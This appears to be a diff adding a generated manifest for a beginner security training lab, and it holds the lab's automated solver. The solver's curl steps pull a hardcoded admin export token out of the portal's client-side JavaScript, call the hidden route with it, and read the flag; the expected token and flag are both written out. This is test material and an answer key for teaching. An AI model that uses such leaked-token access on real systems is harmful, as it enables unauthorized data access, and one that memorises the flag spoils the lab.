@@ -1,0 +1,33 @@
+# Generated from platform/labs/Software Security/software-security-1-1-hidden-export-route/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: software-security-1-1-hidden-export-route
+track: Software Security
+difficulty: beginner
+source: platform/labs/Software Security/software-security-1-1-hidden-export-route/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+- port: 8080
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/software-security-1-1-hidden-export-route.sh
+  steps:
+  - name: Portal responds
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.portal}:8080/
+    expect: '200'
+  - name: JavaScript contains the export route
+    command: curl -s http://{target.portal}:8080/static/app.js | grep -o '/admin/export?token=devfest-export-2026'
+    expect: /admin/export?token=devfest-export-2026
+  - name: Export route returns the flag
+    command: curl -s 'http://{target.portal}:8080/admin/export?token=devfest-export-2026' | grep -o 'OCR{[^}]*}'
+    expect: OCR{cl13nt_s1d3_s3cr3ts_4r3_publ1c}
+expected_flag_count: 1
+expected_flag: OCR{cl13nt_s1d3_s3cr3ts_4r3_publ1c}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 384
+max_cpu: 0.45
